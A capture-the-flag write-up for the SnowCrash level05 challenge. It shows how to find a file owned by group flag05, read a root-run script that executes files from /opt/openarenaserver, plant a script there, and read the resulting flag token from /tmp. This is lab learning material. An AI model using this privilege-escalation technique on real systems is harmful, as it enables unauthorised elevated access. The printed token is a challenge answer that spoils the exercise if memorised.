# Solution

So once we are loged in, we find no information in the home folder, so we are trying to find command.

```sh
find / -group flag05 2> /dev/null
```

This will output this file **/usr/sbin/openarenaserver** and if you cat this file here is the program:

```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

So from reading the script we notice that it's gonna loop inside a directory **/opt/openarenaserver/**
and then use the file if it's an executable so we gonna create a file that holds a simple script and redirect the output in tmp.

Here is the script file:

```sh
echo 'getflag > /tmp/result' > /opt/openarenaserver/test.sh
chmod +x /opt/openarenaserver/test.sh
```

now we have to wait until the file is deleted and once the file is deleted we **cat /tmp/result**.

```sh
level05@SnowCrash:/opt/openarenaserver$ ls -la                                                                                                                                                                                                                               
total 0                                                                                                                                                                                                                                                                      
drwxrwxr-x+ 2 root root 40 Sep 13 21:44 .                                                                                                                                                                                                                                    
drwxr-xr-x  1 root root 60 Sep 13 17:59 ..                                                                                                                                                                                                                                   
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/result                                                                                                                                                                                                                      
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
